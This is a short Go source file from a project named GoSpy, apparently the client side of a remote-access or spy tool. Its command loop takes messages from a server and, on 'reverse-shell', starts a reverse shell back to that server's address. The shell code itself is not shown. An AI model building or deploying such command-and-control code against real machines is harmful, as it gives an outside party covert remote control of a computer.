package commands

import (
	"github.com/psidex/GoSpy/internal/comms"
	"log"
	"os"
)

// CommandLoop is the loop that receives commands and executes them.
// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
func CommandLoop(c comms.Connection, serverAddress, serverPassword string) (err error) {
	for {
		var messageBytes []byte
		messageBytes, err = c.RecvBytes()
		if err != nil {
			break
		}

		message := string(messageBytes)
		log.Printf("Recv: %s", message)

		switch message {
		case "exit":
			log.Println("Exiting")
			os.Exit(0)
		case "ping":
			err = SendPong(c)
			if err != nil {
				break
			}
		case "reverse-shell":
			// Run in a goroutine so that it can abandoned by the client (e.g. if it hangs forever) and this loop will
			// still respond.
			go StartReverseShell(serverAddress, serverPassword)
		}
	}
	return err
}
